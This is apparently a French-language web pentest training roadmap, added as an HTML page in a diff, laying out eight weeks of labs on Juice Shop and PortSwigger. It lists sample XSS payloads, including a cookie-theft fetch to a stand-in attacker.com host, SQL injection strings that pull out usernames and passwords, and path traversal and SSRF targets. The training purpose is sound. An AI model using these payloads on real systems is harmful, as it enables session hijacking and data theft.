@@ -1,0 +1,1238 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Roadmap 8 Semaines — WebSec Academy</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="stylesheet" href="pages.css" />
+  </head>
+  <body>
+    <!-- NAVIGATION -->
+    <nav class="nav">
+      <div class="nav-container">
+        <a href="index.html" class="nav-logo">
+          <span class="logo-icon">🛡️</span>
+          <span class="logo-text">WebSec Academy</span>
+        </a>
+        <button class="nav-toggle" onclick="toggleMenu()">☰</button>
+        <ul class="nav-links" id="navLinks">
+          <li><a href="index.html">Accueil</a></li>
+          <li><a href="roadmap.html" class="active">Roadmap</a></li>
+          <li><a href="javascript-essentials.html">JavaScript</a></li>
+          <li><a href="outils.html">Outils</a></li>
+          <li><a href="ressources.html">Ressources</a></li>
+          <li><a href="cheatsheets.html">Cheat Sheets</a></li>
+        </ul>
+      </div>
+    </nav>
+
+    <!-- HERO -->
+    <header class="page-hero">
+      <div class="hero-icon">🎯</div>
+      <h1>Roadmap <span class="gradient-text">8 Semaines</span></h1>
+      <p class="hero-desc">
+        Plan concret pour devenir opérationnel en pentest web. Chaque semaine =
+        labs + writeups pour ton portfolio.
+      </p>
+
+      <div class="stats-row">
+        <div class="stat-box">
+          <span class="stat-num">8</span>
+          <span class="stat-label">Semaines</span>
+        </div>
+        <div class="stat-box">
+          <span class="stat-num">1-2h</span>
+          <span class="stat-label">Par jour</span>
+        </div>
+        <div class="stat-box">
+          <span class="stat-num">50+</span>
+          <span class="stat-label">Labs</span>
+        </div>
+        <div class="stat-box">
+          <span class="stat-num">10+</span>
+          <span class="stat-label">Writeups</span>
+        </div>
+      </div>
+    </header>
+
+    <!-- PROGRESS -->
+    <section class="progress-section">
+      <div class="container">
+        <div class="progress-card">
+          <div class="progress-header">
+            <span class="progress-title">📊 Progression globale</span>
+            <span class="progress-percent" id="progressPercent">0%</span>
+          </div>
+          <div class="progress-bar-bg">
+            <div class="progress-bar-fill" id="progressBar"></div>
+          </div>
+          <p class="progress-hint">
+            Coche les éléments complétés — sauvegarde automatique ✓
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SETUP -->
+    <section class="section" id="setup">
+      <div class="container">
+        <div class="week-card setup">
+          <div class="week-header">
+            <div class="week-badge setup">SETUP</div>
+            <div class="week-info">
+              <h2>Phase 0 — Setup Initial</h2>
+              <p>Avant de commencer, prépare ton environnement</p>
+            </div>
+            <span class="week-time">📅 Jour 1</span>
+          </div>
+
+          <div class="week-body">
+            <div class="setup-grid">
+              <div class="setup-item">
+                <div class="setup-icon">🔧</div>
+                <h4>1. Choisis ton Proxy</h4>
+                <p>L'outil principal pour intercepter le trafic HTTP</p>
+                <ul>
+                  <li>
+                    <strong>Burp Suite Community</strong> (recommandé, standard
+                    industrie)
+                  </li>
+                  <li><strong>OWASP ZAP</strong> (gratuit, open source)</li>
+                </ul>
+                <div class="setup-links">
+                  <a
+                    href="https://portswigger.net/burp/communitydownload"
+                    target="_blank"
+                    class="btn btn-small"
+                    >Télécharger Burp</a
+                  >
+                  <a
+                    href="https://www.zaproxy.org/download/"
+                    target="_blank"
+                    class="btn btn-small btn-outline"
+                    >Télécharger ZAP</a
+                  >
+                </div>
+              </div>
+
+              <div class="setup-item">
+                <div class="setup-icon">🎯</div>
+                <h4>2. Installe une cible locale</h4>
+                <p>Application vulnérable pour t'entraîner légalement</p>
+                <ul>
+                  <li><strong>OWASP Juice Shop</strong> (recommandé)</li>
+                  <li><strong>OWASP WebGoat</strong> (alternative)</li>
+                </ul>
+                <pre><code># Via Docker (recommandé)
+docker run --rm -p 3000:3000 bkimminich/juice-shop
+
+# Puis ouvrir http://localhost:3000</code></pre>
+              </div>
+
+              <div class="setup-item">
+                <div class="setup-icon">📁</div>
+                <h4>3. Crée ton portfolio</h4>
+                <p>Là où tu stockeras tes writeups (preuves pour CV)</p>
+                <ul>
+                  <li>Dossier local : <code>websec-portfolio/</code></li>
+                  <li>Repo GitHub (si possible, très recommandé)</li>
+                  <li>
+                    Structure : <code>/writeups</code>, <code>/notes</code>,
+                    <code>/tools</code>
+                  </li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="checklist-section">
+              <h4>✅ Checklist Setup</h4>
+              <div class="checklist">
+                <label class="check-item">
+                  <input type="checkbox" data-id="setup-1" />
+                  <span>Proxy installé et fonctionnel (Burp ou ZAP)</span>
+                </label>
+                <label class="check-item">
+                  <input type="checkbox" data-id="setup-2" />
+                  <span>Navigateur configuré pour utiliser le proxy</span>
+                </label>
+                <label class="check-item">
+                  <input type="checkbox" data-id="setup-3" />
+                  <span>Juice Shop (ou WebGoat) accessible sur localhost</span>
+                </label>
+                <label class="check-item">
+                  <input type="checkbox" data-id="setup-4" />
+                  <span>Dossier/repo portfolio créé</span>
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SEMAINE 1 -->
+    <section class="section section-dark" id="week1">
+      <div class="container">
+        <div class="week-card">
+          <div class="week-header">
+            <div class="week-badge">S1</div>
+            <div class="week-info">
+              <h2>Fondamentaux HTTP & Proxy</h2>
+              <p>Comprendre comment le web fonctionne et maîtriser ton outil</p>
+            </div>
+            <span class="week-time">📅 Semaine 1</span>
+          </div>
+
+          <div class="week-body">
+            <div class="content-section">
+              <h4>📚 Ce que tu vas apprendre</h4>
+              <div class="concepts-grid">
+                <div class="concept">
+                  <strong>Requête HTTP</strong>
+                  <span>Méthodes (GET, POST), headers, body, URL encoding</span>
+                </div>
+                <div class="concept">
+                  <strong>Réponse HTTP</strong>
+                  <span
+                    >Status codes (200, 301, 403, 500...), headers de
+                    réponse</span
+                  >
+                </div>
+                <div class="concept">
+                  <strong>Cookies & Sessions</strong>
+                  <span>Comment l'authentification fonctionne</span>
+                </div>
+                <div class="concept">
+                  <strong>Auth vs Authz</strong>
+                  <span>Authentification (qui?) vs Autorisation (quoi?)</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="content-section">
+              <h4>🔬 Labs à faire</h4>
+              <div class="labs-list">
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w1-lab-1" />
+                  <div class="lab-info">
+                    <span class="lab-name"
+                      >Getting started with Burp Suite</span
+                    >
+                    <span class="lab-platform">PortSwigger Academy</span>
+                  </div>
+                  <a
+                    href="https://portswigger.net/web-security/getting-started"
+                    target="_blank"
+                    class="lab-link"
+                    >Ouvrir →</a
+                  >
+                </div>
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w1-lab-2" />
+                  <div class="lab-info">
+                    <span class="lab-name">2-3 labs d'introduction HTTP</span>
+                    <span class="lab-platform"
+                      >PortSwigger — Section "Getting started"</span
+                    >
+                  </div>
+                  <a
+                    href="https://portswigger.net/web-security/all-labs"
+                    target="_blank"
+                    class="lab-link"
+                    >Voir labs →</a
+                  >
+                </div>
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w1-lab-3" />
+                  <div class="lab-info">
+                    <span class="lab-name"
+                      >Explorer Juice Shop avec le proxy</span
+                    >
+                    <span class="lab-platform">OWASP Juice Shop</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="content-section">
+              <h4>🛠️ Pratique Proxy</h4>
+              <div class="checklist">
+                <label class="check-item">
+                  <input type="checkbox" data-id="w1-skill-1" />
+                  <span>Intercepter une requête et la modifier</span>
+                </label>
+                <label class="check-item">
+                  <input type="checkbox" data-id="w1-skill-2" />
+                  <span>Utiliser le Repeater pour rejouer une requête</span>
+                </label>
+                <label class="check-item">
+                  <input type="checkbox" data-id="w1-skill-3" />
+                  <span>Configurer le scope (limiter aux sites de test)</span>
+                </label>
+                <label class="check-item">
+                  <input type="checkbox" data-id="w1-skill-4" />
+                  <span>Lire et filtrer l'historique HTTP</span>
+                </label>
+              </div>
+            </div>
+
+            <div class="deliverables">
+              <h4>📝 Livrables de la semaine</h4>
+              <div class="checklist">
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w1-del-1" />
+                  <span
+                    ><strong>Writeup #1</strong> : Configuration proxy + capture
+                    requête + explication cookies/sessions</span
+                  >
+                </label>
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w1-del-2" />
+                  <span>3 requêtes modifiées et rejouées avec succès</span>
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SEMAINE 2 -->
+    <section class="section" id="week2">
+      <div class="container">
+        <div class="week-card">
+          <div class="week-header">
+            <div class="week-badge">S2</div>
+            <div class="week-info">
+              <h2>Contrôles d'accès (IDOR/BOLA)</h2>
+              <p>Les failles les plus courantes et recherchées en bug bounty</p>
+            </div>
+            <span class="week-time">📅 Semaine 2</span>
+          </div>
+
+          <div class="week-body">
+            <div class="content-section">
+              <h4>📚 Ce que tu vas apprendre</h4>
+              <div class="concepts-grid">
+                <div class="concept highlight">
+                  <strong>IDOR</strong>
+                  <span
+                    >Insecure Direct Object Reference — accéder aux données d'un
+                    autre user en changeant un ID</span
+                  >
+                </div>
+                <div class="concept highlight">
+                  <strong>BOLA</strong>
+                  <span
+                    >Broken Object Level Authorization — même chose, terme
+                    utilisé pour les APIs</span
+                  >
+                </div>
+                <div class="concept">
+                  <strong>Accès horizontal</strong>
+                  <span
+                    >User A accède aux données de User B (même niveau de
+                    privilège)</span
+                  >
+                </div>
+                <div class="concept">
+                  <strong>Accès vertical</strong>
+                  <span
+                    >User normal accède à des fonctions admin (escalade de
+                    privilège)</span
+                  >
+                </div>
+              </div>
+            </div>
+
+            <div class="info-box tip">
+              <h4>💡 Méthode de test IDOR</h4>
+              <ol>
+                <li>Crée 2 comptes (User A et User B)</li>
+                <li>Note les IDs/URLs de chaque compte</li>
+                <li>Connecté en A, essaie d'accéder aux ressources de B</li>
+                <li>
+                  Teste les variations : <code>/api/users/123</code> →
+                  <code>/api/users/124</code>
+                </li>
+                <li>Essaie aussi avec des UUIDs, usernames, emails...</li>
+              </ol>
+            </div>
+
+            <div class="content-section">
+              <h4>🔬 Labs à faire (6-10 labs)</h4>
+              <div class="labs-list">
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w2-lab-1" />
+                  <div class="lab-info">
+                    <span class="lab-name"
+                      >Access control vulnerabilities (section complète)</span
+                    >
+                    <span class="lab-platform"
+                      >PortSwigger Academy — 6 à 10 labs</span
+                    >
+                  </div>
+                  <a
+                    href="https://portswigger.net/web-security/access-control"
+                    target="_blank"
+                    class="lab-link"
+                    >Ouvrir →</a
+                  >
+                </div>
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w2-lab-2" />
+                  <div class="lab-info">
+                    <span class="lab-name"
+                      >Challenges d'accès sur Juice Shop</span
+                    >
+                    <span class="lab-platform">OWASP Juice Shop</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="deliverables">
+              <h4>📝 Livrables de la semaine</h4>
+              <div class="checklist">
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w2-del-1" />
+                  <span
+                    ><strong>Writeup #2</strong> : Lab Access Control avec
+                    étapes de reproduction</span
+                  >
+                </label>
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w2-del-2" />
+                  <span
+                    ><strong>Writeup #3</strong> : IDOR/BOLA sur API avec
+                    requêtes HTTP</span
+                  >
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SEMAINE 3 -->
+    <section class="section section-dark" id="week3">
+      <div class="container">
+        <div class="week-card">
+          <div class="week-header">
+            <div class="week-badge">S3</div>
+            <div class="week-info">
+              <h2>XSS (Cross-Site Scripting)</h2>
+              <p>Injecter du JavaScript malicieux dans les pages web</p>
+            </div>
+            <span class="week-time">📅 Semaine 3</span>
+          </div>
+
+          <div class="week-body">
+            <div class="content-section">
+              <h4>📚 Les 3 types de XSS</h4>
+              <div class="xss-types">
+                <div class="xss-type">
+                  <div class="xss-icon">🔄</div>
+                  <h5>Reflected XSS</h5>
+                  <p>Payload dans l'URL, exécuté immédiatement</p>
+                  <code
+                    >search.php?q=&lt;script&gt;alert(1)&lt;/script&gt;</code
+                  >
+                </div>
+                <div class="xss-type">
+                  <div class="xss-icon">💾</div>
+                  <h5>Stored XSS</h5>
+                  <p>Payload stocké en BDD, exécuté pour tous les visiteurs</p>
+                  <span class="example">Ex: commentaire malicieux</span>
+                </div>
+                <div class="xss-type">
+                  <div class="xss-icon">🌐</div>
+                  <h5>DOM-based XSS</h5>
+                  <p>Payload manipule le DOM côté client (pas de serveur)</p>
+                  <span class="example">Ex: location.hash, innerHTML</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="content-section">
+              <h4>🧪 Payloads de base</h4>
+              <pre><code class="language-javascript">// Test simple
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+// Dans un attribut HTML
+" onmouseover="alert(1)
+' onfocus='alert(1)' autofocus='
+
+// Dans une URL (href)
+javascript:alert(1)
+
+// Bypass majuscules
+&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;img src=x onerror=alert(1)&gt;
+
+// Vol de cookie (impact réel)
+&lt;script&gt;fetch('https://attacker.com?c='+document.cookie)&lt;/script&gt;</code></pre>
+            </div>
+
+            <div class="content-section">
+              <h4>🔬 Labs à faire (8-12 labs)</h4>
+              <div class="labs-list">
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w3-lab-1" />
+                  <div class="lab-info">
+                    <span class="lab-name"
+                      >Cross-site scripting (section complète)</span
+                    >
+                    <span class="lab-platform"
+                      >PortSwigger Academy — 8 à 12 labs</span
+                    >
+                  </div>
+                  <a
+                    href="https://portswigger.net/web-security/cross-site-scripting"
+                    target="_blank"
+                    class="lab-link"
+                    >Ouvrir →</a
+                  >
+                </div>
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w3-lab-2" />
+                  <div class="lab-info">
+                    <span class="lab-name">XSS challenges sur Juice Shop</span>
+                    <span class="lab-platform">OWASP Juice Shop</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="deliverables">
+              <h4>📝 Livrables de la semaine</h4>
+              <div class="checklist">
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w3-del-1" />
+                  <span
+                    ><strong>Writeup #4</strong> : XSS avec "contexte → payload
+                    → impact"</span
+                  >
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SEMAINE 4 -->
+    <section class="section" id="week4">
+      <div class="container">
+        <div class="week-card">
+          <div class="week-header">
+            <div class="week-badge">S4</div>
+            <div class="week-info">
+              <h2>SQL Injection</h2>
+              <p>Manipuler les requêtes base de données</p>
+            </div>
+            <span class="week-time">📅 Semaine 4</span>
+          </div>
+
+          <div class="week-body">
+            <div class="content-section">
+              <h4>📚 Types de SQLi</h4>
+              <div class="concepts-grid">
+                <div class="concept">
+                  <strong>Error-based</strong>
+                  <span
+                    >Erreurs SQL visibles → extraire des infos des messages
+                    d'erreur</span
+                  >
+                </div>
+                <div class="concept">
+                  <strong>Union-based</strong>
+                  <span
+                    >Combiner des requêtes avec UNION SELECT pour extraire des
+                    données</span
+                  >
+                </div>
+                <div class="concept">
+                  <strong>Blind Boolean</strong>
+                  <span
+                    >Pas d'erreur visible, réponse true/false selon la
+                    condition</span
+                  >
+                </div>
+                <div class="concept">
+                  <strong>Blind Time-based</strong>
+                  <span
+                    >Pas de réponse visible, mais délai si condition vraie
+                    (SLEEP)</span
+                  >
+                </div>
+              </div>
+            </div>
+
+            <div class="content-section">
+              <h4>🧪 Payloads de détection</h4>
+              <pre><code class="language-sql">-- Test de base (casse la requête)
+' OR '1'='1
+' OR '1'='1' --
+" OR "1"="1
+
+-- Détection d'erreur
+'
+''
+`
+')
+
+-- Union (trouver le nombre de colonnes)
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+-- Extraire des données
+' UNION SELECT username,password FROM users--
+
+-- Time-based blind
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+
+-- Boolean blind
+' AND 1=1--  (true)
+' AND 1=2--  (false)</code></pre>
+            </div>
+
+            <div class="content-section">
+              <h4>🔬 Labs à faire (8-12 labs)</h4>
+              <div class="labs-list">
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w4-lab-1" />
+                  <div class="lab-info">
+                    <span class="lab-name"
+                      >SQL injection (section complète)</span
+                    >
+                    <span class="lab-platform"
+                      >PortSwigger Academy — 8 à 12 labs</span
+                    >
+                  </div>
+                  <a
+                    href="https://portswigger.net/web-security/sql-injection"
+                    target="_blank"
+                    class="lab-link"
+                    >Ouvrir →</a
+                  >
+                </div>
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w4-lab-2" />
+                  <div class="lab-info">
+                    <span class="lab-name">SQLi sur WebGoat</span>
+                    <span class="lab-platform">OWASP WebGoat (optionnel)</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="deliverables">
+              <h4>📝 Livrables de la semaine</h4>
+              <div class="checklist">
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w4-del-1" />
+                  <span
+                    ><strong>Writeup #5</strong> : SQLi (blind ou union) avec
+                    étapes + explication</span
+                  >
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SEMAINE 5 -->
+    <section class="section section-dark" id="week5">
+      <div class="container">
+        <div class="week-card">
+          <div class="week-header">
+            <div class="week-badge">S5</div>
+            <div class="week-info">
+              <h2>API Security</h2>
+              <p>Tester les APIs REST — très demandé en 2024+</p>
+            </div>
+            <span class="week-time">📅 Semaine 5</span>
+          </div>
+
+          <div class="week-body">
+            <div class="content-section">
+              <h4>📚 Concepts clés API</h4>
+              <div class="concepts-grid">
+                <div class="concept">
+                  <strong>REST API</strong>
+                  <span
+                    >Architecture standard : GET, POST, PUT, DELETE + JSON</span
+                  >
+                </div>
+                <div class="concept highlight">
+                  <strong>JWT</strong>
+                  <span
+                    >JSON Web Token : header.payload.signature (base64)</span
+                  >
+                </div>
+                <div class="concept">
+                  <strong>BOLA/IDOR (API)</strong>
+                  <span>Même principe qu'IDOR, appliqué aux endpoints API</span>
+                </div>
+                <div class="concept">
+                  <strong>Mass Assignment</strong>
+                  <span
+                    >Modifier des champs non autorisés : {"role":"admin"}</span
+                  >
+                </div>
+                <div class="concept">
+                  <strong>Excessive Data Exposure</strong>
+                  <span>L'API retourne trop d'informations sensibles</span>
+                </div>
+                <div class="concept">
+                  <strong>Rate Limiting</strong>
+                  <span>Absence de limite = brute force possible</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="info-box tip">
+              <h4>💡 Comment mapper une API</h4>
+              <ol>
+                <li>Ouvre les DevTools (F12) → onglet Network</li>
+                <li>Navigue sur le site et note les appels XHR/Fetch</li>
+                <li>
+                  Crée un tableau :
+                  <strong>Endpoint | Méthode | Params | Auth requise?</strong>
+                </li>
+                <li>Teste chaque endpoint avec différents rôles</li>
+                <li>Cherche la documentation API (Swagger, /api/docs, etc.)</li>
+              </ol>
+            </div>
+
+            <div class="content-section">
+              <h4>🔬 Labs à faire</h4>
+              <div class="labs-list">
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w5-lab-1" />
+                  <div class="lab-info">
+                    <span class="lab-name">JWT attacks</span>
+                    <span class="lab-platform">PortSwigger Academy</span>
+                  </div>
+                  <a
+                    href="https://portswigger.net/web-security/jwt"
+                    target="_blank"
+                    class="lab-link"
+                    >Ouvrir →</a
+                  >
+                </div>
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w5-lab-2" />
+                  <div class="lab-info">
+                    <span class="lab-name">Access control avancé (API)</span>
+                    <span class="lab-platform">PortSwigger Academy</span>
+                  </div>
+                  <a
+                    href="https://portswigger.net/web-security/access-control"
+                    target="_blank"
+                    class="lab-link"
+                    >Ouvrir →</a
+                  >
+                </div>
+                <div class="lab-item">
+                  <input type="checkbox" data-id="w5-lab-3" />
+                  <div class="lab-info">
+                    <span class="lab-name">Mapper l'API de Juice Shop</span>
+                    <span class="lab-platform"
+                      >OWASP Juice Shop — trouve les endpoints cachés</span
+                    >
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="deliverables">
+              <h4>📝 Livrables de la semaine</h4>
+              <div class="checklist">
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w5-del-1" />
+                  <span
+                    ><strong>Writeup #6</strong> : Lab JWT (attaque +
+                    explication)</span
+                  >
+                </label>
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w5-del-2" />
+                  <span
+                    ><strong>Writeup #7</strong> : API mapping + test BOLA
+                    (table des endpoints)</span
+                  >
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SEMAINE 6 -->
+    <section class="section" id="week6">
+      <div class="container">
+        <div class="week-card">
+          <div class="week-header">
+            <div class="week-badge">S6</div>
+            <div class="week-info">
+              <h2>Spécialisation (1 sujet au choix)</h2>
+              <p>SSRF, File Upload ou Path Traversal — choisis et maîtrise</p>
+            </div>
+            <span class="week-time">📅 Semaine 6</span>
+          </div>
+
+          <div class="week-body">
+            <div class="info-box warning">
+              <h4>⚠️ Règle importante</h4>
+              <p>
+                Choisis <strong>UN seul thème</strong> et deviens bon dessus.
+                Mieux vaut maîtriser 1 sujet que survoler 3. Tu pourras
+                apprendre les autres après.
+              </p>
+            </div>
+
+            <div class="specializations">
+              <div class="spec-card">
+                <div class="spec-header">
+                  <span class="spec-icon">🌐</span>
+                  <h4>Option A : SSRF</h4>
+                  <span class="spec-tag">Server-Side Request Forgery</span>
+                </div>
+                <div class="spec-body">
+                  <p>
+                    Forcer le serveur à faire des requêtes vers des ressources
+                    internes
+                  </p>
+                  <ul>
+                    <li>
+                      Accéder à <code>http://localhost</code>,
+                      <code>http://127.0.0.1</code>
+                    </li>
+                    <li>AWS metadata : <code>http://169.254.169.254</code></li>
+                    <li>Scanner le réseau interne</li>
+                    <li>Contourner les firewalls</li>
+                  </ul>
+                  <a
+                    href="https://portswigger.net/web-security/ssrf"
+                    target="_blank"
+                    class="btn btn-small"
+                    >Labs SSRF →</a
+                  >
+                </div>
+              </div>
+
+              <div class="spec-card">
+                <div class="spec-header">
+                  <span class="spec-icon">📁</span>
+                  <h4>Option B : File Upload</h4>
+                  <span class="spec-tag">Unrestricted File Upload</span>
+                </div>
+                <div class="spec-body">
+                  <p>Uploader des fichiers malicieux pour exécuter du code</p>
+                  <ul>
+                    <li>Webshell PHP, JSP, ASP</li>
+                    <li>
+                      Contourner les validations (extension, MIME, magic bytes)
+                    </li>
+                    <li>Path traversal dans le nom de fichier</li>
+                    <li>Polyglot files</li>
+                  </ul>
+                  <a
+                    href="https://portswigger.net/web-security/file-upload"
+                    target="_blank"
+                    class="btn btn-small"
+                    >Labs File Upload →</a
+                  >
+                </div>
+              </div>
+
+              <div class="spec-card">
+                <div class="spec-header">
+                  <span class="spec-icon">📂</span>
+                  <h4>Option C : Path Traversal</h4>
+                  <span class="spec-tag">Directory Traversal</span>
+                </div>
+                <div class="spec-body">
+                  <p>Lire des fichiers hors du répertoire web autorisé</p>
+                  <ul>
+                    <li>Payload : <code>../../../etc/passwd</code></li>
+                    <li>Bypass : encodage URL, double encoding</li>
+                    <li>Fichiers sensibles : config, logs, clés</li>
+                    <li>Null byte injection (legacy)</li>
+                  </ul>
+                  <a
+                    href="https://portswigger.net/web-security/file-path-traversal"
+                    target="_blank"
+                    class="btn btn-small"
+                    >Labs Path Traversal →</a
+                  >
+                </div>
+              </div>
+            </div>
+
+            <div class="deliverables">
+              <h4>📝 Livrables de la semaine</h4>
+              <div class="checklist">
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w6-del-1" />
+                  <span
+                    ><strong>Writeup #8</strong> : Ton thème choisi avec schéma
+                    "entrée → traitement → impact"</span
+                  >
+                </label>
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w6-del-2" />
+                  <span>6-10 labs complétés sur ce thème</span>
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SEMAINE 7 -->
+    <section class="section section-dark" id="week7">
+      <div class="container">
+        <div class="week-card highlight">
+          <div class="week-header">
+            <div class="week-badge project">PROJET</div>
+            <div class="week-info">
+              <h2>Mini Audit — Rapport Professionnel</h2>
+              <p>Réalise un vrai audit et documente-le comme un pro</p>
+            </div>
+            <span class="week-time">📅 Semaine 7</span>
+          </div>
+
+          <div class="week-body">
+            <div class="content-section">
+              <h4>🎯 Le projet</h4>
+              <div class="project-desc">
+                <p>
+                  Réalise un <strong>mini audit complet</strong> de Juice Shop
+                  (ou autre cible autorisée). L'objectif n'est pas de tout
+                  trouver, mais de documenter proprement ce que tu trouves.
+                </p>
+                <ul>
+                  <li>
+                    Trouve <strong>5 vulnérabilités</strong> (pas plus, mais
+                    bien documentées)
+                  </li>
+                  <li>Rédige un <strong>rapport professionnel</strong></li>
+                  <li>Format : PDF ou Markdown</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="content-section">
+              <h4>📄 Structure du rapport</h4>
+              <div class="report-structure">
+                <div class="report-section">
+                  <span class="section-num">1</span>
+                  <div class="section-content">
+                    <h5>Résumé exécutif</h5>
+                    <p>Pour un manager : risques business en 5 lignes max</p>
+                  </div>
+                </div>
+                <div class="report-section">
+                  <span class="section-num">2</span>
+                  <div class="section-content">
+                    <h5>Périmètre & Méthodologie</h5>
+                    <p>Ce que tu as testé, comment, avec quels outils</p>
+                  </div>
+                </div>
+                <div class="report-section">
+                  <span class="section-num">3</span>
+                  <div class="section-content">
+                    <h5>Findings (x5)</h5>
+                    <p>
+                      Pour chaque vuln : titre, sévérité, description, étapes,
+                      preuve, impact, recommandation
+                    </p>
+                  </div>
+                </div>
+                <div class="report-section">
+                  <span class="section-num">4</span>
+                  <div class="section-content">
+                    <h5>Annexes</h5>
+                    <p>Requêtes HTTP brutes (sans secrets/tokens réels)</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="info-box tip">
+              <h4>💡 Échelle de sévérité (CVSS simplifié)</h4>
+              <div class="severity-scale">
+                <div class="severity critical">
+                  <span class="sev-label">Critical</span>
+                  <span class="sev-desc"
+                    >RCE, accès admin complet, fuite massive de données</span
+                  >
+                </div>
+                <div class="severity high">
+                  <span class="sev-label">High</span>
+                  <span class="sev-desc"
+                    >SQLi, SSRF interne, XSS stocké avec impact</span
+                  >
+                </div>
+                <div class="severity medium">
+                  <span class="sev-label">Medium</span>
+                  <span class="sev-desc"
+                    >IDOR, XSS reflected, info disclosure</span
+                  >
+                </div>
+                <div class="severity low">
+                  <span class="sev-label">Low</span>
+                  <span class="sev-desc">Headers manquants, info mineure</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="deliverables">
+              <h4>📝 Livrable de la semaine</h4>
+              <div class="checklist">
+                <label class="check-item deliverable major">
+                  <input type="checkbox" data-id="w7-del-1" />
+                  <span
+                    ><strong>Rapport d'audit complet</strong> : PDF/Markdown
+                    avec 5 findings (format professionnel)</span
+                  >
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SEMAINE 8 -->
+    <section class="section" id="week8">
+      <div class="container">
+        <div class="week-card final">
+          <div class="week-header">
+            <div class="week-badge final">FINAL</div>
+            <div class="week-info">
+              <h2>Portfolio, CV & Préparation entretien</h2>
+              <p>Finalise tes livrables et prépare-toi à postuler</p>
+            </div>
+            <span class="week-time">📅 Semaine 8</span>
+          </div>
+
+          <div class="week-body">
+            <div class="content-section">
+              <h4>📋 Tâches de la semaine</h4>
+              <div class="tasks-grid">
+                <div class="task-item">
+                  <div class="task-icon">📂</div>
+                  <h5>Organise ton portfolio</h5>
+                  <p>
+                    Tous tes writeups, propres et accessibles (GitHub
+                    recommandé)
+                  </p>
+                </div>
+                <div class="task-item">
+                  <div class="task-icon">📄</div>
+                  <h5>Crée ton CV</h5>
+                  <p>1 page max : projets, compétences, outils maîtrisés</p>
+                </div>
+                <div class="task-item">
+                  <div class="task-icon">🔄</div>
+                  <h5>Refais 10 labs</h5>
+                  <p>Sans regarder les solutions — teste ta mémoire</p>
+                </div>
+                <div class="task-item">
+                  <div class="task-icon">📝</div>
+                  <h5>Crée ta cheat sheet</h5>
+                  <p>Ta méthodologie personnelle de test web (1-2 pages)</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="content-section">
+              <h4>❓ Questions d'entretien à préparer</h4>
+              <div class="interview-questions">
+                <div class="question">
+                  <span class="q-icon">Q</span>
+                  <p>"Explique ce qu'est une IDOR et comment tu la testes"</p>
+                </div>
+                <div class="question">
+                  <span class="q-icon">Q</span>
+                  <p>
+                    "Quelle est la différence entre authentification et
+                    autorisation?"
+                  </p>
+                </div>
+                <div class="question">
+                  <span class="q-icon">Q</span>
+                  <p>"Comment tu testerais la sécurité d'une API REST?"</p>
+                </div>
+                <div class="question">
+                  <span class="q-icon">Q</span>
+                  <p>"Décris une XSS stored et son impact potentiel"</p>
+                </div>
+                <div class="question">
+                  <span class="q-icon">Q</span>
+                  <p>"Comment tu documentes une vulnérabilité?"</p>
+                </div>
+                <div class="question">
+                  <span class="q-icon">Q</span>
+                  <p>"Qu'est-ce que CORS et pourquoi c'est important?"</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="deliverables">
+              <h4>📝 Livrables finaux</h4>
+              <div class="checklist">
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w8-del-1" />
+                  <span
+                    ><strong>CV 1 page</strong> : projets + compétences +
+                    outils</span
+                  >
+                </label>
+                <label class="check-item deliverable">
+                  <input type="checkbox" data-id="w8-del-2" />
